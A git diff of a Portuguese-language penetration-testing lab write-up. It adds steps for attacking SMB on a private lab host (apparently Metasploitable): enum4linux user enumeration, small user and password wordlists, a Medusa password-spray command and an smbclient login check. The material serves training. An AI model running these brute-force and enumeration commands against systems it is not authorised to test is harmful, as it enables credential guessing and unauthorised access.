@@ -63,8 +63,9 @@ Acesso com qualquer credencial para verificar em modo de desenvolvedor no navega
 ![](/images/10%20comando%20hydra%20forca%20bruta.PNG)
 ![](/images/11%20encontrado%20login.PNG)
 
-### 3. Simulando um ataque ao alvo utilizando o protocolo SMB
-Realizando o comando para iniciar uma enumeração de usuarios, verificando quais são os usuarios reais no sistema e grava a saida do comando em um arquivo txt:
+## Simulando um ataque ao alvo utilizando o protocolo SMB
+
+### 1. Realizando o comando para iniciar uma enumeração de usuarios, verificando quais são os usuarios reais no sistema e grava a saida do comando em um arquivo txt:
 
     enum4linux -a 192.168.217.3 | tee enum4_output.txt
 
@@ -84,3 +85,29 @@ Lendo o arquivo enum4_output.txt
 
 ![](/images/20%20lendo%20arquivo%20criado.PNG)
 ![](/images/21%20lendo%20arquivo%20criado.PNG)
+
+### 2. Criando um arquivo de wordlist de usuários e senhas
+
+    echo -e "user\nmsfadmin\nservice" > smb_users.txt
+
+
+    echo -e "password\n123456\nWelcome123\nmsfadmin" > senhas_spray.txt
+
+
+Confirmando os arquivos criados em /HOME
+
+![](/images/22%20criando%20wordlist.PNG)
+
+### 3. Simulação do ataque smb com os arquivos e o comando
+
+
+    medusa -h 192.168.217.3 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50
+
+![](/images/23%20medusa%20tentativa%20smb.PNG)
+
+### 4. Testando o acessp smb no alvo
+
+
+    smbclient -L //192.168.217.3 -U msfadmin
+
+![](/images/24%20teste%20de%20acesso%20smbclient.PNG)
